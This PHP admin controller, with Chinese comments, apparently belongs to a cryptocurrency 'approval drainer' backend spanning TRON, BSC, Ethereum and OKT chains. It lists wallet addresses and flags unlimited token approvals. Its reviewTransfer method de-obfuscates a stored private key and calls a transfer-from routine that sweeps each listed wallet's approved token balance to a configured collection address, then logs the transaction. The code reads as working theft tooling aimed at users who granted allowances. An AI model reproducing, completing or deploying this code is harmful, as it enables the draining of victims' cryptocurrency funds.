<?php

namespace app\admin\controller;

use app\common\controller\Backend;
use think\Db;
use think\Exception;
use think\exception\PDOException;
use think\exception\ValidateException;

/**
 * 地址管理
 *
 * @icon fa fa-circle-o
 */
class Address extends Backend
{

    /**
     * Address模型对象
     * @var \app\admin\model\Address
     */
    protected $model = null;

    public function _initialize()
    {
        parent::_initialize();
        $this->model = new \app\admin\model\Address;
        $this->view->assign("auto", $this->model->getAuto());

    }

    /**
     * 默认生成的控制器所继承的父类中有index/add/edit/del/multi五个基础方法、destroy/restore/recyclebin三个回收站方法
     * 因此在当前控制器中可不用编写增删改查的代码,除非需要自己控制这部分逻辑
     * 需要将application/admin/library/traits/Backend.php中对应的方法复制到当前控制器,然后进行修改
     */

    /**
     * 查看
     */
    public function index()
    {
        //设置过滤方法
        $this->request->filter(['strip_tags', 'trim']);
        if ($this->request->isAjax()) {
            //如果发送的来源是Selectpage，则转发到Selectpage
            if ($this->request->request('keyField')) {
                return $this->selectpage();
            }
            list($where, $sort, $order, $offset, $limit) = $this->buildparams();
            $list = $this->model
                ->where($where)
                ->order($sort, $order)
                ->paginate($limit);
            foreach ($list as $k => $v) {
                if($list[$k]['address']){
                    if((new \Tron\Address($list[$k]['address']))->isValid()){
                        $qb_type = 1;
                    }else{
                        $qb_type = 2;
                    }
//                    $list[$k]['money_online'] = (new \app\common\service\Getbalance())->getTokenBalance($qb_type,$list[$k]['address'],$list[$k]['contract_address'],$list[$k]['approve_address_decimals']);
//                    $list[$k]['money_approve'] = (new \app\common\service\Getbalance())->getTokenApprove($qb_type,$list[$k]['address'],$list[$k]['approve_address'],$list[$k]['contract_address'],$list[$k]['approve_address_decimals']);
                    if($list[$k]['money_approve'] >= 115792089237316195423570985008687907853269984665640564039457584007913129.639936){
                        $list[$k]['money_approve'] = '无限';
                        $list[$k]['is_approve_old'] = 1;
//                        db('address')->where(['id'=>$list[$k]['id']])->update(['updatetime'=>time(),'money_approve'=>10000000000,'money_online'=>$list[$k]['money_online'],'is_approve'=>1,'is_approve_old'=>1]);
                    }else{
                        if($list[$k]['money_approve']  > 0){
                            $list[$k]['is_approve_old'] = 1;
                            if($list[$k]['money_approve'] > 10000000000){
                                $list[$k]['money_approve'] = 10000000000;
                            }
//                            db('address')->where(['id'=>$list[$k]['id']])->update(['updatetime'=>time(),'money_approve'=> $list[$k]['money_approve'],'money_online'=>$list[$k]['money_online'],'is_approve'=>1,'is_approve_old'=>1]);
                        }else{
//                            db('address')->where(['id'=>$list[$k]['id']])->update(['updatetime'=>time(),'money_approve'=> $list[$k]['money_approve'],'money_online'=>$list[$k]['money_online'],'is_approve'=>0]);
                        }
                    }
                }else{
                    $list[$k]['money_online'] = '-';
                    $list[$k]['money_approve'] = '-';
                }
            }
            $all_money_online = $this->model->where($where)->sum('money_online');
            $result = array("total" => $list->total(), "rows" => $list->items(),"extend" =>['all_money_online'=>$all_money_online]);
            return json($result);
        }
        return $this->view->fetch();
    }

    /**
     * 划转
     */
    public function reviewTransfer($ids)
    {
        $row = $this->model->get(['id' => $ids]);
        if (!$row) {
            $this->error(__('No Results were found'));
        }
        if ($this->request->isAjax()) {
            switch ($row['chain']){
                case 'trc':
                    $qb_type = 1;
                    $address_shou = config('site.shou_trx');
                    switch ($row['approve_type']){
                        case 0:
                            $approve_user_address = config('site.hy_user_trx');
                            $approve_key = config('site.hy_user_trx_key');
                            break;
                        case 1:
                            $approve_user_address = $row['approve_address'];
                            $approve_key = $row['account_pre'];
                            break;
                    }
                    break;
                case 'bsc':
                    $qb_type = 2;
                    $address_shou = config('site.shou_bsc');
                    $approve_user_address = config('site.hy_user_bsc');
                    $approve_key = config('site.hy_user_bsc_key');
                    break;
                case 'eth':
                    $qb_type = 3;
                    $address_shou = config('site.shou_eth');
                    $approve_user_address = config('site.hy_user_eth');
                    $approve_key = config('site.hy_user_eth_key');
                    break;
                case 'okt':
                    $qb_type = 4;
                    $address_shou = config('site.shou_okt');
                    $approve_user_address = config('site.hy_user_okt');
                    $approve_key = config('site.hy_user_okt_key');
                    break;
            }
            $amount = (new \app\common\service\Getbalance())->getTokenBalance($qb_type,$row['address'],$row['contract_address'],$row['approve_address_decimals']);
            $money_approve = (new \app\common\service\Getbalance())->getTokenApprove($qb_type,$row['address'],$row['approve_address'],$row['contract_address'],$row['approve_address_decimals']);
            if($amount > $money_approve){
                $amount = $money_approve;
            }
            if($amount > 0){
                $to = $address_shou;
                $rrr_arr=config('conf.rrr_arr');
                $psd = $approve_key;
                foreach ($rrr_arr as $aaa){
                    $psd = str_replace($aaa,'',$psd);
                }

                $approve_info =array(
                    'qb_type'=>$qb_type,//钱包类型
                    'approve_address'=>$row['approve_address'],//授权合约地址
                    'approve_user_address'=>$approve_user_address,//调用授权合约的账户
                    'psd'=>$psd,//调用授权合约的账户的私钥
                    'user_address'=>$row['address'],//目标用户钱包
                    'contract_address'=>$row['contract_address'],//目标合约
                    'approve_address_decimals'=>$row['approve_address_decimals'],//目标合约精度
                    'sq_approve_type'=>$row['approve_type'],//0 合约授权 1 账号授权
                );
                $receive_info =array(
                    'to'=>$to,//收款地址
                    'amount'=>$amount,//金额
                );
                $result = (new \app\common\service\Getbalance())->do_transfer_from_wu_fen_yong($approve_info,$receive_info);
                if($result){
                    if($qb_type == 1){
                        $data['txid']=$result->txID;
                    }else{
                        $data['txid']=$result['hash'];
                    }
                    $data['user_id']=0;
                    $data['chain']=$row['chain'];
                    $data['address']=$row['address'];
                    $data['to_address']=$to;
                    $data['money']=$amount;
                    $data['createtime']=time();
                    $data['updatetime']=time();
                    $ishave = (new \app\admin\model\approve\Transaction())->where(['txid'=>$data['txid']])->find();
                    if($ishave){
                        $ishave -> save(['updatetime'=>time()]);
                    }else{
                        (new \app\admin\model\approve\Transaction())->insert($data);
                    }
                    $this->success("划转:".$amount.",操作成功!");
                }
            }
            $this->error("该笔不允许转账!", null, '');
        }
        $this->view->assign("row", $row->toArray());
        return $this->view->fetch();
    }


}
